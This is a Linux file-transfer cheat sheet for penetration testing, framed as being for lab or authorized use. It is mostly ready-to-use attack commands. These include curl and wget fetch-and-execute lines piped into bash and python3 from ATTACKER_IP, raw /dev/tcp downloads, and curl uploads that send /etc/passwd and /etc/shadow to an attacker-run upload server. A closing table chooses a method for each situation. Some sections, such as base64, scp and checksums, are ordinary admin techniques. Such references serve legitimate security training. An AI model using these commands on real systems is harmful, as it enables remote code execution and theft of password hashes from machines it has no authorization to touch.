# Linux File Transfer Cheat Sheet

> Lab/authorized testing. Replace `ATTACKER_IP`, paths, usernames, and filenames.

## 1. Base64 — Clipboard / No Network

### Target → Attacker
```bash
# Target
base64 -w 0 /path/file > /tmp/file.b64
cat /tmp/file.b64

# Or directly
cat /path/file | base64 -w 0; echo

# Attacker
cat file.b64 | base64 -d > file
md5sum /path/file
md5sum file
```

### Attacker → Target
```bash
# Attacker
cat file | base64 -w 0; echo

# Target
printf '%s' '<BASE64>' | base64 -d > file
md5sum file
```

---

## 2. wget / cURL — HTTP(S) Download

### wget
```bash
wget http://ATTACKER_IP:8000/file -O /tmp/file
```

### cURL
```bash
curl http://ATTACKER_IP:8000/file -o /tmp/file
```

### Download → Execute (fileless)
```bash
curl http://ATTACKER_IP:8000/script.sh | bash
wget -qO- http://ATTACKER_IP:8000/script.py | python3
```

> `| bash` / `| python3` avoids saving the downloaded script first, but the program itself may still create files.

---

## 3. Start a Simple HTTP Server

### Python 3
```bash
python3 -m http.server 8000
```

### Python 2
```bash
python2.7 -m SimpleHTTPServer 8000
```

### PHP
```bash
php -S 0.0.0.0:8000
```

### Ruby
```bash
ruby -run -ehttpd . -p8000
```

### Download from the server
```bash
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file
```

---

## 4. Bash `/dev/tcp` — Raw TCP HTTP Download

```bash
exec 3<>/dev/tcp/ATTACKER_IP/80
echo -e "GET /file HTTP/1.1\r\nHost: ATTACKER_IP\r\nConnection: close\r\n\r\n" >&3
cat <&3
exec 3>&-
```

> Requires a Bash build supporting `/dev/tcp` redirections. This is raw TCP, not a normal HTTP client.

---

## 5. SCP — SSH File Transfer

### Start SSH server on attacker
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
ss -lntp | grep ':22'
```

### Remote Linux → Attacker
```bash
scp USER@TARGET_IP:/remote/path/file /local/path/
```

### Attacker → Remote Linux
```bash
scp /local/path/file USER@TARGET_IP:/remote/path/
```

### Directory transfer
```bash
scp -r USER@TARGET_IP:/remote/path/dir /local/path/
scp -r /local/path/dir USER@TARGET_IP:/remote/path/
```

---

## 6. Web Upload — `uploadserver`

### Attacker: install
```bash
python3 -m pip install --user uploadserver
```

### HTTP upload server
```bash
python3 -m uploadserver 8000
```

### HTTPS upload server (self-signed)
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver 443 --server-certificate ~/server.pem
```

### Target → Attacker
```bash
curl -X POST http://ATTACKER_IP:8000/upload \
  -F 'files=@/etc/passwd'
```

### Multiple files
```bash
curl -X POST http://ATTACKER_IP:8000/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow'
```

### Self-signed HTTPS
```bash
curl -k -X POST https://ATTACKER_IP:443/upload \
  -F 'files=@/etc/passwd'
```

> `-k` / `--insecure` disables TLS certificate verification.

---

## 7. File Integrity

### MD5
```bash
md5sum file
```

### SHA-256
```bash
sha256sum file
```

### Compare
```bash
md5sum file
sha256sum file
```

---

## Transfer Decision

```text
No network / only shell paste → Base64
HTTP/HTTPS available           → wget / curl
Need fileless script execution → curl|bash / wget|python3
No wget/curl                   → Bash /dev/tcp (if supported)
SSH reachable                  → scp
Need target → attacker upload  → uploadserver + curl
```
